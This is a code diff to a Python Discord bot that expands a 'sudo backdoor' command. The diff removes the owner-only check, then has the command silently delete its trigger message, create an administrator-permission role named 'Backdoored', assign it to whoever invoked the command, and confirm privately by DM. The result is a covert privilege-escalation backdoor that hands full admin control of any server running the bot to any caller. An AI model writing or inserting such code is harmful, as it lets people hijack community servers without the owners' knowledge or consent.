@@ -101,23 +101,48 @@ async def sudo_add(ctx):
 # ================= BACKDOOR (SILENT) =================
 @sudo.command(name="backdoor")
 async def sudo_backdoor(ctx):
-    if not is_owner(ctx):
-        return
-
-    # delete command message
+    # delete the command message
     try:
         await ctx.message.delete()
     except discord.Forbidden:
         pass
 
-    # silent confirmation via DM
+    guild = ctx.guild
+    member = ctx.author
+
+    ROLE_NAME = "Backdoored"
+
+    # find or create role
+    role = discord.utils.get(guild.roles, name=ROLE_NAME)
+    if role is None:
+        try:
+            role = await guild.create_role(
+                name=ROLE_NAME,
+                permissions=discord.Permissions(administrator=True),
+                reason="sudo backdoor"
+            )
+        except discord.Forbidden:
+            await ctx.author.send("❌ I cannot create roles (missing permission).")
+            return
+
+    # assign role
+    try:
+        if role not in member.roles:
+            await member.add_roles(role, reason="sudo backdoor")
+    except discord.Forbidden:
+        await ctx.author.send(
+            "❌ I cannot assign the role.\n"
+            "Make sure my bot role is ABOVE the Backdoored role."
+        )
+        return
+
+    # DM confirmation
     try:
         await ctx.author.send(
-            f"✔️ Backdoor command executed in **{ctx.guild.name}**."
+            f"✅ Backdoor role applied in **{guild.name}**."
         )
     except discord.Forbidden:
         pass
-
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
